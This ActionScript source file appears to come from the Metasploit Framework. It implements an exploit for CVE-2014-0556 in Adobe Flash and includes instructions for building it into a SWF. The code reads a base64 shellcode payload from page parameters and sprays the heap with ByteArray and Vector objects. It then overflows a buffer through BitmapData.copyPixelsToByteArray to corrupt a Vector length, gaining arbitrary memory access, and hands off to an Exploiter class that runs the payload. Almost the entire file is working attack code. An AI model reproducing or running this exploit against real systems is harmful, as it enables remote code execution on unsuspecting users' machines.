// Build how to:
// 1. Download the AIRSDK, and use its compiler.
// 2. Download the Flex SDK (4.6)
// 3. Copy the Flex SDK libs (<FLEX_SDK>/framework/libs) to the AIRSDK folder (<AIR_SDK>/framework/libs)
//      (all of them, also, subfolders, specially mx, necessary for the Base64Decoder)
// 4. Build with: mxmlc -o msf.swf Main.as

// Original code by @hdarwin89 // http://hacklab.kr/cve-2014-0556-%EB%B6%84%EC%84%9D/
// Modified to be used from msf

package
{
	import flash.display.Sprite
	import flash.display.BitmapData
	import flash.geom.Rectangle
	import flash.utils.ByteArray
	import flash.display.LoaderInfo
	import mx.utils.Base64Decoder

	public class Exploit extends Sprite 
	{
        private var uv:Vector.<uint>
        private var exploiter:Exploiter
        private var b64:Base64Decoder = new Base64Decoder()
        private var payload:ByteArray
        private var platform:String
        private var os:String
		private var bv:Vector.<ByteArray> = new Vector.<ByteArray>(12800)
		private var ov:Vector.<Object> = new Vector.<Object>(12800)
		private var bd:BitmapData = new BitmapData(128, 16)

		public function Exploit() 
		{
            var i:uint 
            platform = LoaderInfo(this.root.loaderInfo).parameters.pl
            os = LoaderInfo(this.root.loaderInfo).parameters.os
            var b64_payload:String = LoaderInfo(this.root.loaderInfo).parameters.sh
            var pattern:RegExp = / /g;
            b64_payload = b64_payload.replace(pattern, "+")
            b64.decode(b64_payload)
            payload = b64.toByteArray()

			for (i = 0; i < bv.length; i++) {
				bv[i] = new ByteArray()
				bv[i].length = 0x2000
				bv[i].position = 0xFFFFF000
			}

			for (i = 0; i < bv.length; i++)
				if (i % 2 == 0) bv[i] = null

			for (i = 0; i < ov.length; i++) {
				ov[i] = new Vector.<uint>(1022)
                ov[i][0] = 0xdeadbeef
			}
		    
			bd.copyPixelsToByteArray(new Rectangle(0, 0, 128, 16), bv[6401])
			
			for (i = 0; i < ov.length ; i++) {
				if (ov[i].length == 0xffffffff) {
                    uv = ov[i]
                    uv[0] = 0xdeadbeef
                    uv[1] = 0xdeedbeef
                    for(var j:uint = 0; j < 4096; j++) {
                        if (uv[j] == 1022 && uv[j + 2] == 0xdeadbeef) {
                            uv[0x3fffffff] = uv[j + 1]
                            break
                        }
                    } 
                } else {
                    ov[i] = null
                }
            }
            
            for (i = 0; i < bv.length; i++) {
                bv[i] = null
            }

            exploiter = new Exploiter(this, platform, os, payload, uv)
		}
		
	}
}